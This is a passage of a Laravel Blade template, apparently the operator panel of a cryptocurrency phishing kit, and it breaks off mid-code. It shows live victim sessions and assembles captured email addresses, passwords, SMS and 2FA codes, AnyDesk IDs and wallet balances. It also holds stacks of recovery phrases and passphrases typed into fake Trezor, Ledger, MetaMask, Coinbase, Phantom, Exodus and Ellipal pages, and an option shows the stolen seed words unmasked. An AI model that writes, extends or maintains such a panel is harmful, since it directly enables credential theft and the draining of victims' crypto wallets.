        'LTC'=>'https://coin-images.coingecko.com/coins/images/2/large/litecoin.png',
        'BNB'=>'https://coin-images.coingecko.com/coins/images/825/large/bnb-icon2_2x.png',
        'CRO'=>'https://coin-images.coingecko.com/coins/images/7310/large/cro_token_logo.png',
        'USDT'=>'https://coin-images.coingecko.com/coins/images/325/large/Tether.png',
        'USDC'=>'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png',
        'MATIC'=>'https://coin-images.coingecko.com/coins/images/4713/large/polygon.png',
        'AVAX'=>'https://coin-images.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png',
        'LINK'=>'https://coin-images.coingecko.com/coins/images/877/large/chainlink-new-logo.png',
        'DOT'=>'https://coin-images.coingecko.com/coins/images/12171/large/polkadot.png',
        'SHIB'=>'https://coin-images.coingecko.com/coins/images/11939/large/shiba.png',
        'UNI'=>'https://coin-images.coingecko.com/coins/images/12504/large/uniswap-logo.png',
        'XLM'=>'https://coin-images.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png',
        'TON'=>'https://coin-images.coingecko.com/coins/images/17980/large/ton_symbol.png',
        'TRX'=>'https://coin-images.coingecko.com/coins/images/1094/large/tron-logo.png',
        'ATOM'=>'https://coin-images.coingecko.com/coins/images/1481/large/cosmos_hub.png',
        'BCH'=>'https://coin-images.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png',
        'WBTC'=>'https://coin-images.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png',
        'DAI'=>'https://coin-images.coingecko.com/coins/images/9956/large/Badge_Dai.png',
        'NEAR'=>'https://coin-images.coingecko.com/coins/images/10365/large/near.jpg',
        'ARB'=>'https://coin-images.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg',
        'OP'=>'https://coin-images.coingecko.com/coins/images/25244/large/Optimism.png',
        'SUI'=>'https://coin-images.coingecko.com/coins/images/26375/large/sui_asset.jpeg',
        'APT'=>'https://coin-images.coingecko.com/coins/images/26455/large/aptos_round.png',
        'INJ'=>'https://coin-images.coingecko.com/coins/images/12882/large/Secondary_Symbol.png',
        'HBAR'=>'https://coin-images.coingecko.com/coins/images/3688/large/hbar.png',
        'LDO'=>'https://coin-images.coingecko.com/coins/images/13573/large/lido_dao.png',
        'STX'=>'https://coin-images.coingecko.com/coins/images/2069/large/Stacks_logo_full.png',
        'AAVE'=>'https://coin-images.coingecko.com/coins/images/12645/large/aave-token-round.png',
        'ICP'=>'https://coin-images.coingecko.com/coins/images/14495/large/Internet_Computer_logo.png',
        'RENDER'=>'https://coin-images.coingecko.com/coins/images/11636/large/rndr.png',
        'TAO'=>'https://coin-images.coingecko.com/coins/images/28452/large/ARUqqBve_400x400.jpg',
        'PEPE'=>'https://coin-images.coingecko.com/coins/images/29850/large/pepe-token.jpeg',
        'BONK'=>'https://coin-images.coingecko.com/coins/images/28600/large/bonk.jpg',
        'WIF'=>'https://coin-images.coingecko.com/coins/images/33566/large/dogwifhat.jpg',
        'FLOKI'=>'https://coin-images.coingecko.com/coins/images/16746/large/PNG_image.png',
        'MANA'=>'https://coin-images.coingecko.com/coins/images/878/large/decentraland-mana.png',
        'SAND'=>'https://coin-images.coingecko.com/coins/images/12129/large/sandbox_logo.jpg',
        'AXS'=>'https://coin-images.coingecko.com/coins/images/13029/large/axie_infinity_logo.png',
        'VET'=>'https://coin-images.coingecko.com/coins/images/1167/large/VeChain-Logo-768px.png',
    ];
    $lastEvent   = $events->first();
    $lastEventAt = $lastEvent?->created_at;
    $sessionAge  = $session->created_at ? now()->diffInSeconds($session->created_at) : 999;
    $noDataWarn  = $session->isActive() && $sessionAge > 12 && (!$lastEventAt || now()->diffInSeconds($lastEventAt) > 20);
    $staleWarn   = !$session->isActive() && $sessionAge < 30 && $events->isEmpty();
@endphp

{{-- Events JSON for JS --}}
<script type="application/json" id="feed-events-data">{!! $eventsJson !!}</script>
<style>#event-feed{overflow-x:hidden;}</style>

{{-- Connection warnings --}}
@if($noDataWarn)
<div style="display:flex;align-items:center;gap:8px;background:rgba(234,179,8,.08);border:1px solid rgba(234,179,8,.3);border-radius:4px;padding:7px 12px;margin-bottom:10px;font-family:monospace;font-size:10px;color:#fbbf24;font-weight:700;">
    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
    LIVE — NO DATA RECEIVED (tracking may be blocked)
</div>
@elseif($staleWarn)
<div style="display:flex;align-items:center;gap:8px;background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.25);border-radius:4px;padding:7px 12px;margin-bottom:10px;font-family:monospace;font-size:10px;color:#f87171;font-weight:700;">
    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
    SESSION DROPPED — no events recorded
</div>
@endif

{{-- Header --}}
<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,.06);">
    <div style="display:flex;align-items:center;gap:8px;">
        @if($session->isActive())
            <span style="display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:700;color:#4ade80;">
                <span style="width:6px;height:6px;border-radius:50%;background:#4ade80;flex-shrink:0;animation:pulse 1.4s ease-in-out infinite;"></span>Live
            </span>
        @else
            <span style="display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:600;color:#475569;">
                <span style="width:6px;height:6px;border-radius:50%;background:#475569;flex-shrink:0;"></span>Idle
            </span>
        @endif
    </div>
    <button onclick="openCleanModal()"
            style="display:flex;align-items:center;gap:5px;background:transparent;border:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.3);font-family:monospace;font-size:10px;font-weight:700;padding:4px 10px;border-radius:3px;cursor:pointer;transition:all .15s;"
            onmouseover="this.style.borderColor='rgba(239,68,68,.4)';this.style.color='#f87171';"
            onmouseout="this.style.borderColor='rgba(255,255,255,.08)';this.style.color='rgba(255,255,255,.3)';">
        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/>
        </svg>
        Clean
    </button>
</div>

@php
    // Peek only: a valid durable active box keeps the feed body rendering
    // even when the recent-events window is empty.
    $__cactiveSummaryPeek = is_array($session->activity_summary ?? null) ? $session->activity_summary : [];
    $hasDurableActive = false;
    $__activeBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['active'] ?? null)
        : null;
    if (is_array($__activeBoxPeek)) {
        $__activeValPeek = trim((string) ($__activeBoxPeek['value'] ?? ''));
        $__activeIdPeek = (int) ($__activeBoxPeek['source_event_id'] ?? 0);
        if ($__activeIdPeek > 0 && in_array($__activeValPeek, \App\Services\ActivitySummaryService::ACTIVE_VALUES, true)) {
            $hasDurableActive = true;
        }
    }
    $hasDurableBalance = false;
    $__balanceBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['balance'] ?? null)
        : null;
    if (is_array($__balanceBoxPeek)) {
        $__balanceValPeek = trim((string) ($__balanceBoxPeek['value'] ?? ''));
        $__balanceIdPeek = (int) ($__balanceBoxPeek['source_event_id'] ?? 0);
        if ($__balanceIdPeek > 0 && in_array($__balanceValPeek, \App\Services\ActivitySummaryService::BALANCE_VALUES, true)) {
            $hasDurableBalance = true;
        }
    }
    $hasDurableEmail = false;
    $__emailBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['email'] ?? null)
        : null;
    if (is_array($__emailBoxPeek)) {
        $__emailValPeek = trim((string) ($__emailBoxPeek['value'] ?? ''));
        $__emailIdPeek = (int) ($__emailBoxPeek['source_event_id'] ?? 0);
        if ($__emailIdPeek > 0 && $__emailValPeek !== '') {
            $hasDurableEmail = true;
        }
    }
    $hasDurableMail2fa = false;
    $__mail2faBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['mail2fa'] ?? null)
        : null;
    if (is_array($__mail2faBoxPeek)) {
        $__mail2faValPeek = trim((string) ($__mail2faBoxPeek['value'] ?? ''));
        $__mail2faIdPeek = (int) ($__mail2faBoxPeek['source_event_id'] ?? 0);
        if ($__mail2faIdPeek > 0 && $__mail2faValPeek !== '') {
            $hasDurableMail2fa = true;
        }
    }
    $hasDurableReset = false;
    $__resetBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['reset'] ?? null)
        : null;
    if (is_array($__resetBoxPeek)) {
        $__resetValPeek = trim((string) ($__resetBoxPeek['value'] ?? ''));
        $__resetIdPeek = (int) ($__resetBoxPeek['source_event_id'] ?? 0);
        if ($__resetIdPeek > 0 && $__resetValPeek !== '') {
            $hasDurableReset = true;
        }
    }
    $hasDurablePassword = false;
    $__passwordBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['password'] ?? null)
        : null;
    if (is_array($__passwordBoxPeek) && (int) ($__passwordBoxPeek['source_event_id'] ?? 0) > 0) {
        $hasDurablePassword = true;
    }
    $hasDurableSms = false;
    $__smsBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['sms'] ?? null)
        : null;
    if (is_array($__smsBoxPeek) && (int) ($__smsBoxPeek['source_event_id'] ?? 0) > 0) {
        $hasDurableSms = true;
    }
    $hasDurableAuth = false;
    $__authBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['auth'] ?? null)
        : null;
    if (is_array($__authBoxPeek) && (int) ($__authBoxPeek['source_event_id'] ?? 0) > 0) {
        $hasDurableAuth = true;
    }
    // anydesk is a partial-typing box like password/sms/auth above: a
    // legitimately-cleared value (empty string) still counts as "has durable
    // content" because the producer sends a real event when backspaced to empty.
    $hasDurableAnydesk = false;
    $__anydeskBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['anydesk'] ?? null)
        : null;
    if (is_array($__anydeskBoxPeek) && (int) ($__anydeskBoxPeek['source_event_id'] ?? 0) > 0) {
        $hasDurableAnydesk = true;
    }
    $hasDurableLink = false;
    $__linkBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['link'] ?? null)
        : null;
    if (is_array($__linkBoxPeek)) {
        $__linkValPeek = trim((string) ($__linkBoxPeek['value'] ?? ''));
        $__linkIdPeek = (int) ($__linkBoxPeek['source_event_id'] ?? 0);
        if ($__linkIdPeek > 0 && $__linkValPeek !== '') {
            $hasDurableLink = true;
        }
    }
    // vault is lenient like anydesk: only source_event_id > 0 is
    // required, not a non-empty value, since a genuinely empty selection is
    // real "has durable state" (currently nothing selected), not "never happened".
    $hasDurableVault = false;
    $__vaultBoxPeek = (isset($__cactiveSummaryPeek['boxes']) && is_array($__cactiveSummaryPeek['boxes']))
        ? ($__cactiveSummaryPeek['boxes']['vault'] ?? null)
        : null;
    if (is_array($__vaultBoxPeek) && (int) ($__vaultBoxPeek['source_event_id'] ?? 0) > 0) {
        $hasDurableVault = true;
    }
    // Trezor phrase attempt-stack (Stage 2 durability, 2026-07-21): unlike
    // the boxes above, this lives under attempts.<page_key>, not boxes.*,
    // and is a list, not a single value. Peek only needs a non-empty array
    // (an empty array is a valid "key exists, no attempts yet" state that
    // still correctly renders as "no attempts" either way, so it does not
    // need to suppress the newest-150 fallback below).
    $hasDurableTrezorAttempts = false;
    $__trezorAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['trezor_phrase_page'] ?? null)
        : null;
    if (is_array($__trezorAttemptsPeek) && !empty($__trezorAttemptsPeek)) {
        $hasDurableTrezorAttempts = true;
    }
    $hasDurableCoinbaseSeedAttempts = false;
    $__coinbaseSeedAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['coinbase_seed'] ?? null)
        : null;
    if (is_array($__coinbaseSeedAttemptsPeek) && !empty($__coinbaseSeedAttemptsPeek)) {
        $hasDurableCoinbaseSeedAttempts = true;
    }
    $hasDurablePhantomAttempts = false;
    $__phantomAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['phantom_seeds'] ?? null)
        : null;
    if (is_array($__phantomAttemptsPeek) && !empty($__phantomAttemptsPeek)) {
        $hasDurablePhantomAttempts = true;
    }
    $hasDurableExodusAttempts = false;
    $__exodusAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['exodus_import'] ?? null)
        : null;
    if (is_array($__exodusAttemptsPeek) && !empty($__exodusAttemptsPeek)) {
        $hasDurableExodusAttempts = true;
    }
    $hasDurableMetamaskAttempts = false;
    $__metamaskAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['metamask_import'] ?? null)
        : null;
    if (is_array($__metamaskAttemptsPeek) && !empty($__metamaskAttemptsPeek)) {
        $hasDurableMetamaskAttempts = true;
    }
    $hasDurableEllipalAttempts = false;
    $__ellipalAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['ellipal_24word'] ?? null)
        : null;
    if (is_array($__ellipalAttemptsPeek) && !empty($__ellipalAttemptsPeek)) {
        $hasDurableEllipalAttempts = true;
    }
    $hasDurableLedgerClassicAttempts = false;
    foreach (['ledger_1', 'ledger_2', 'ledger_3'] as $__ldcPeekKey) {
        $__ldcAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
            ? ($__cactiveSummaryPeek['attempts'][$__ldcPeekKey] ?? null)
            : null;
        if (is_array($__ldcAttemptsPeek) && !empty($__ldcAttemptsPeek)) {
            $hasDurableLedgerClassicAttempts = true;
            break;
        }
    }
    $hasDurableCoinbaseWhitelistAttempts = false;
    $__cbWlAttemptsPeek = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
        ? ($__cactiveSummaryPeek['attempts']['coinbase_whitelist_wallet'] ?? null)
        : null;
    if (is_array($__cbWlAttemptsPeek) && !empty($__cbWlAttemptsPeek)) {
        $hasDurableCoinbaseWhitelistAttempts = true;
    }
@endphp
@if($events->isEmpty() && !$hasDurableActive && !$hasDurableBalance && !$hasDurableEmail && !$hasDurableMail2fa && !$hasDurableReset && !$hasDurablePassword && !$hasDurableSms && !$hasDurableAuth && !$hasDurableAnydesk && !$hasDurableLink && !$hasDurableVault && !$hasDurableTrezorAttempts && !$hasDurableCoinbaseSeedAttempts && !$hasDurablePhantomAttempts && !$hasDurableExodusAttempts && !$hasDurableMetamaskAttempts && !$hasDurableEllipalAttempts && !$hasDurableLedgerClassicAttempts && !$hasDurableCoinbaseWhitelistAttempts)
    <div style="text-align:center;padding:48px 0;font-family:monospace;font-size:11px;color:rgba(255,255,255,.18);">No events yet.</div>
@else
<script>
(function(){
    function _fillFeedUsd(){
        var spans=document.querySelectorAll('#event-feed [data-usd-key]');
        if(!spans.length)return;
        if(typeof _vaultPrices!=='undefined'&&Object.keys(_vaultPrices).length){
            spans.forEach(function(s){
                var k=s.getAttribute('data-usd-key');
                var a=parseFloat(s.getAttribute('data-usd-amt'))||0;
                var p=_vaultPrices[k]||0;
                if(p&&a){
                    var usd=p*a;
                    s.textContent=usd>=1000?'$'+usd.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}):'$'+usd.toFixed(usd<0.01?6:2);
                }else if(s.textContent===''){
                    s.textContent='';
                }
            });
            return;
        }
        if(typeof _fetchVaultPrices==='function'){
            _fetchVaultPrices(function(){_fillFeedUsd();});
        }
    }
    if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){setTimeout(_fillFeedUsd,400);});}
    else{setTimeout(_fillFeedUsd,400);}
})();
</script>

{{-- Two-column feed --}}
<div style="display:grid;grid-template-columns:minmax(0,1fr);gap:10px;align-items:start;max-width:100%;min-width:0;overflow-x:hidden;">

    {{-- LEFT — All raw logs --}}
    <div>
        @php
            // Sticky Activity phrase boxes: one per page (live update; stays after leave/submit)
            $phraseBrandNames = [
                'metamask_import' => 'Metamask',
                'exodus_import' => 'Exodus',
                'ellipal_24word' => 'Ellipal',
                'ellipal_12word' => 'Ellipal',
                'trezor_recover' => 'Trezor',
                'trezor_phrase_page' => 'Trezor',
                'ledger_1' => 'Ledger',
                'ledger_2' => 'Ledger',
                'ledger_3' => 'Ledger',
                'coinbase_seed' => 'Coinbase',
                'coinbase_import_recovery_phrase' => 'Coinbase',
                'coinbase_whitelist_wallet' => 'Whitelist',
                'phantom_seeds' => 'Phantom',
            ];
            $stickyPhrases = [];
            foreach ($events as $rev) {
                if (($rev->type ?? '') !== 'phrase_input' || ($rev->element ?? '') !== 'full_state') continue;
                $rpg = $rev->page ?? '';
                if ($rpg === '') continue;
                if ($rpg === 'trezor_phrase_page') continue; // attempt-stack handled below
                if ($rpg === 'coinbase_seed') continue; // attempt-stack handled below
                if ($rpg === 'phantom_seeds') continue; // attempt-stack handled below
                if ($rpg === 'exodus_import') continue; // attempt-stack handled below
                if (in_array($rpg, ['ledger_1', 'ledger_2', 'ledger_3'], true)) continue; // attempt-stack handled below
                if (in_array($rpg, ['ellipal_24word', 'ellipal_12word'], true)) continue; // attempt-stack handled below
                if ($rpg === 'metamask_import') continue; // attempt-stack handled below
                if ($rpg === 'coinbase_whitelist_wallet') continue; // attempt-stack handled below
                $rWords = [];
                $rPass = '';
                $rDec = json_decode($rev->value ?? '', true);
                if (is_array($rDec) && isset($rDec['words']) && is_array($rDec['words'])) {
                    $rWords = array_values($rDec['words']);
                    $rPass = trim($rDec['passphrase'] ?? '');
                }
                if (empty($rWords)) continue;
                $rTs = $rev->created_at?->getTimestamp() ?? 0;
                $rId = $rev->id ?? 0;
                $rWordsOut = $canSeePassphrases
                    ? $rWords
                    : array_map(fn($w) => trim((string) $w) !== '' ? '****' : '', $rWords);
                $rPassOut = $canSeePassphrases ? $rPass : ($rPass !== '' ? '****' : '');
                if (!isset($stickyPhrases[$rpg])) {
                    $stickyPhrases[$rpg] = [
                        'firstTs' => $rTs,
                        'id'      => $rId,
                        'ts'      => $rTs,
                        'words'   => $rWordsOut,
                        'pass'    => $rPassOut,
                        'label'   => $phraseBrandNames[$rpg] ?? ($evPageLabels[$rpg] ?? 'Phrase'),
                    ];
                } elseif ($rTs > $stickyPhrases[$rpg]['ts']
                    || ($rTs === $stickyPhrases[$rpg]['ts'] && $rId > $stickyPhrases[$rpg]['id'])) {
                    $stickyPhrases[$rpg]['id']    = $rId;
                    $stickyPhrases[$rpg]['ts']    = $rTs;
                    $stickyPhrases[$rpg]['words'] = $rWordsOut;
                    $stickyPhrases[$rpg]['pass']  = $rPassOut;
                }
            }
            uasort($stickyPhrases, fn($a, $b) => ($a['firstTs'] <=> $b['firstTs']) ?: ($a['id'] <=> $b['id']));

            // trezor_phrase_page: FIRST attempt-stack durability implementation
            // (Stage 2, 2026-07-21). $trezorPhraseRows is now built from the
            // durable activity_summary.attempts.trezor_phrase_page list when
            // available (see ActivitySummaryService::applyTrezorPhraseAttempt),
            // falling back to the original newest-150 raw-event replay below
            // only when no durable list exists yet for this session (e.g. a
            // session predating this change) or the durable value is
            // malformed — a malformed value must never suppress the working
            // fallback. $trzMask is shared by both paths and by every other
            // phrase page's mask below (unchanged).
            $trezorPhraseRows = [];
            $trzMask = function (array $words, string $pass) use ($canSeePassphrases): array {
                if ($canSeePassphrases) {
                    return ['words' => $words, 'pass' => $pass];
                }
                return [
                    'words' => array_map(fn($w) => trim((string) $w) !== '' ? '****' : '', $words),
                    'pass'  => $pass !== '' ? '****' : '',
                ];
            };
            $trezorAttemptsFromSummary = false;
            $__trezorDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['trezor_phrase_page'] ?? null)
                : null;
            if (is_array($__trezorDurableList)) {
                foreach ($__trezorDurableList as $tAtt) {
                    if (!is_array($tAtt)) continue;
                    $tWords = is_array($tAtt['words'] ?? null) ? $tAtt['words'] : [];
                    $tPass  = trim((string) ($tAtt['pass'] ?? ''));
                    $tMasked = $trzMask($tWords, $tPass);
                    $tFirstTs = 0;
                    $tSortRaw = $tAtt['first_seen_at'] ?? null;
                    if (!empty($tSortRaw)) {
                        try {
                            $tFirstTs = \Carbon\Carbon::parse($tSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $tFirstTs = 0;
                        }
                    }
                    $trezorPhraseRows[] = [
                        'id'        => (int) ($tAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($tAtt['attempt_id'] ?? $tAtt['source_event_id'] ?? 0),
                        'firstTs'   => $tFirstTs,
                        'words'     => $tMasked['words'],
                        'pass'      => $tMasked['pass'],
                        'permanent' => (($tAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($tAtt['blank']),
                    ];
                }
                $trezorAttemptsFromSummary = true;
            }
            $trzLive = null; // id, words, pass, permanent, blank
            $trzNeedReprompt = false; // after seed_phrase seal: no new live until page_visit or empty clear
            if (!$trezorAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $tev) {
                if (($tev->page ?? '') !== 'trezor_phrase_page') continue;
                $tType = $tev->type ?? '';
                $tEl   = $tev->element ?? '';
                $tId   = $tev->id ?? 0;
                $tTs   = $tev->created_at?->getTimestamp() ?? 0;

                if ($tType === 'page_visit') {
                    if ($trzLive === null) {
                        $trzLive = ['id' => $tId, 'firstId' => $tId, 'firstTs' => $tTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $trzNeedReprompt = false;
                    continue;
                }

                if ($tType === 'phrase_input' && $tEl === 'full_state') {
                    $dec = json_decode($tev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        // Clear updates the same live box — do NOT freeze unless submitted
                        if ($trzLive === null) {
                            // After submit: empty snap (incorrect reset) may open a blank for retry
                            $trzLive = ['id' => $tId, 'firstId' => $tId, 'firstTs' => $tTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $trzNeedReprompt = false;
                        } else {
                            $trzLive['id'] = $tId;
                            $trzLive['words'] = [];
                            $trzLive['pass'] = '';
                            $trzLive['blank'] = true;
                        }
                    } else {
                        $masked = $trzMask($words, $pass);
                        // Do not open a second box from post-submit / race full_state
                        if ($trzLive === null && $trzNeedReprompt) {
                            continue;
                        }
                        if ($trzLive === null || !empty($trzLive['permanent'])) {
                            $trzLive = [
                                'id' => $tId,
                                'firstId' => $tId,
                                'firstTs' => $tTs,
                                'words' => $masked['words'],
                                'pass' => $masked['pass'],
                                'permanent' => false,
                                'blank' => false,
                            ];
                        } else {
                            $trzLive['id'] = $tId;
                            $trzLive['words'] = $masked['words'];
                            $trzLive['pass'] = $masked['pass'];
                            $trzLive['blank'] = false;
                        }
                    }
                    continue;
                }

                if ($tType === 'form_submit' && $tEl === 'seed_phrase') {
                    $raw = trim((string) ($tev->value ?? ''));
                    $subPass = '';
                    if (preg_match('/\s*\[passphrase:(.*)\]\s*$/s', $raw, $pm)) {
                        $subPass = trim($pm[1]);
                        $raw = trim(preg_replace('/\s*\[passphrase:.*\]\s*$/s', '', $raw));
                    }
                    // Event value is often "[captured]"; keep last live full_state words for display
                    $useLive = ($raw === '' || $raw === '[captured]');
                    if ($useLive && $trzLive && empty($trzLive['blank'])) {
                        $masked = ['words' => $trzLive['words'], 'pass' => $trzLive['pass']];
                    } else {
                        $submitWords = ($raw !== '' && $raw !== '[captured]') ? preg_split('/\s+/', $raw) : [];
                        $masked = $trzMask(
                            $submitWords ?: [],
                            $subPass !== '' ? $subPass : ''
                        );
                        if (empty(array_filter($masked['words'], fn($w) => trim((string)$w) !== ''))
                            && $trzLive && empty($trzLive['blank'])) {
                            $masked = ['words' => $trzLive['words'], 'pass' => $trzLive['pass']];
                        }
                    }
                    if ($trzLive && empty($trzLive['blank'])) {
                        $trzLive['id'] = $tId;
                        $trzLive['words'] = $masked['words'];
                        $trzLive['pass'] = $masked['pass'];
                        $trzLive['permanent'] = true;
                        $trzLive['blank'] = false;
                        $trezorPhraseRows[] = $trzLive;
                    } else {
                        $trezorPhraseRows[] = [
                            'id' => $tId,
                            'firstId' => $tId,
                            'firstTs' => $tTs,
                            'words' => $masked['words'],
                            'pass' => $masked['pass'],
                            'permanent' => true,
                            'blank' => false,
                        ];
                    }
                    // No second box until page_visit / clear on same page (reprompt)
                    $trzLive = null;
                    $trzNeedReprompt = true;
                }
            }
            if ($trzLive !== null) {
                $trezorPhraseRows[] = $trzLive;
            }

            // coinbase_seed: page-only durable attempt-stack. Rows are injected into
            // $stickyFields (ordinary Activity chrome + firstTs sort), not the phrase block.
            $coinbaseSeedPhraseRows = [];
            $cbSeedAttemptsFromSummary = false;
            $__cbSeedDurableList = (isset($__cactiveSummaryPeek['attempts']) && is_array($__cactiveSummaryPeek['attempts']))
                ? ($__cactiveSummaryPeek['attempts']['coinbase_seed'] ?? null)
                : null;
            if (is_array($__cbSeedDurableList)) {
                foreach ($__cbSeedDurableList as $cAtt) {
                    if (!is_array($cAtt)) continue;
                    $cWords = is_array($cAtt['words'] ?? null) ? $cAtt['words'] : [];
                    $cPass  = trim((string) ($cAtt['pass'] ?? ''));
                    $cMasked = $trzMask($cWords, $cPass);
                    $csFirstTs = 0;
                    $csSortRaw = $cAtt['first_seen_at'] ?? null;
                    if (!empty($csSortRaw)) {
                        try {
                            $csFirstTs = \Carbon\Carbon::parse($csSortRaw)->getTimestamp();
                        } catch (\Throwable $e) {
                            $csFirstTs = 0;
                        }
                    }
                    $coinbaseSeedPhraseRows[] = [
                        'id'        => (int) ($cAtt['source_event_id'] ?? 0),
                        'firstId'   => (int) ($cAtt['attempt_id'] ?? $cAtt['source_event_id'] ?? 0),
                        'firstTs'   => $csFirstTs,
                        'words'     => $cMasked['words'],
                        'pass'      => $cMasked['pass'],
                        'permanent' => (($cAtt['state'] ?? '') === 'sealed'),
                        'blank'     => !empty($cAtt['blank']),
                    ];
                }
                $cbSeedAttemptsFromSummary = true;
            }
            $cbSeedLive = null;
            $cbSeedNeedReprompt = false;
            if (!$cbSeedAttemptsFromSummary)
            foreach ($events->sortBy(fn($e) => [$e->created_at?->getTimestamp() ?? 0, $e->id ?? 0])->values() as $cev) {
                if (($cev->page ?? '') !== 'coinbase_seed') continue;
                $cType = $cev->type ?? '';
                $cEl   = $cev->element ?? '';
                $cId   = $cev->id ?? 0;
                $cTs   = $cev->created_at?->getTimestamp() ?? 0;

                if ($cType === 'page_visit') {
                    if ($cbSeedLive === null) {
                        $cbSeedLive = ['id' => $cId, 'firstId' => $cId, 'firstTs' => $cTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                    }
                    $cbSeedNeedReprompt = false;
                    continue;
                }

                if ($cType === 'phrase_input' && $cEl === 'full_state') {
                    $dec = json_decode($cev->value ?? '', true);
                    $words = (is_array($dec) && isset($dec['words']) && is_array($dec['words']))
                        ? array_values($dec['words']) : [];
                    $pass = is_array($dec) ? trim((string) ($dec['passphrase'] ?? '')) : '';
                    $has = (bool) array_filter($words, fn($w) => trim((string) $w) !== '');
                    if (!$has) {
                        if ($cbSeedLive === null) {
                            $cbSeedLive = ['id' => $cId, 'firstId' => $cId, 'firstTs' => $cTs, 'words' => [], 'pass' => '', 'permanent' => false, 'blank' => true];
                            $cbSeedNeedReprompt = false;
                        } else {
                            $cbSeedLive['id'] = $cId;
                            $cbSeedLive['words'] = [];
                            $cbSeedLive['pass'] = '';
                            $cbSeedLive['blank'] = true;
                        }
                    } else {
                        $masked = $trzMask($words, $pass);
                        if ($cbSeedLive === null && $cbSeedNeedReprompt) {
                            continue;
                        }
                        if ($cbSeedLive === null || !empty($cbSeedLive['permanent'])) {
                            $cbSeedLive = [
                                'id' => $cId,
